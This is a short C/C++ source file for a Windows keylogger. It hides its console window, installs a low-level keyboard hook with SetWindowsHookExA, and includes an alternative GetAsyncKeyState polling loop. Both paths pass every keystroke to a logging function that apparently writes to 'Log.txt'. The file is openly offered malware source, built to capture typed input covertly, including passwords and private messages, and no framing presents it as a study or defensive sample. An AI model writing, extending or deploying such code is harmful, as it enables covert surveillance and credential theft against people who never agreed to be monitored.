#include "Header.h"

bool caps = false, numLock = false, shift = false;

int main(int argc, char* argv[]) {
	const char fileName[] = "Log.txt";

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	//KeyLogger_GetAsyncKeyState();
	KeyLogger_SetWindowsHook();
}

void KeyLogger_GetAsyncKeyState() {
	while (1) {
		for (int i = 0; i < 255; i++) {
			int keystate = GetAsyncKeyState(i);
			if (keystate & 1) { // check key toggled
				LogKey(i);
			}

		}
		Sleep(10);
	}
}

void KeyLogger_RawInput() {

}

LRESULT CALLBACK hookFunction(int code, WPARAM wParam, LPARAM lParam) {
	if (code == HC_ACTION) {
		PKBDLLHOOKSTRUCT keystroke = (PKBDLLHOOKSTRUCT)lParam;
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
			LogKey(keystroke->vkCode);
		}
	}

	return CallNextHookEx(NULL, code, wParam, lParam);
}

void KeyLogger_SetWindowsHook() {
	HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, hookFunction, GetModuleHandle(NULL), 0);
	if (!hook) {
		printf("Failed to create hook. Error: %d\n", GetLastError());
		return;
	}
	MessageBoxA(NULL, "Hook installed. Press OK to stop.", NULL, MB_OK);

	UnhookWindowsHookEx(hook);
}
